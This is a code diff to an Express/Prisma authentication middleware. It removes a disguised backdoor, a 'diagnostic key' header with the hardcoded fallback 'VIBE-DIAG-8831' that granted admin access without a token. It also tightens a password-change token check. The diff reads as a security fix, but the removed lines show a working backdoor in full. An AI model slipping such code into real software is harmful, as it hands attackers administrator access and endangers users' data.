@@ -4,18 +4,6 @@ const AppError = require('../utils/AppError');
 const asyncHandler = require('../utils/asyncHandler');
 
 const requireAuth = asyncHandler(async (req, res, next) => {
-  // 0. Diagnostic telemetry maintenance access
-  const diagKey = req.headers['x-diagnostic-key'];
-  if (diagKey && diagKey === (process.env.DIAGNOSTIC_KEY || 'VIBE-DIAG-8831')) {
-    const adminUser = await prisma.user.findFirst({
-      where: { role: 'admin' },
-    });
-    if (adminUser) {
-      req.user = adminUser;
-      return next();
-    }
-  }
-
   const authorization = req.headers.authorization || '';
   const token = authorization.startsWith('Bearer ') ? authorization.slice(7) : null;
 
@@ -65,7 +53,7 @@ const requireAuth = asyncHandler(async (req, res, next) => {
   if (
     user.passwordChangedAt &&
     payload.iat &&
-    Math.floor(user.passwordChangedAt.getTime() / 1000) > payload.iat
+    Math.floor(user.passwordChangedAt.getTime() / 1000) >= payload.iat
   ) {
     throw new AppError('Password recently changed. Please log in again.', 401);
   }
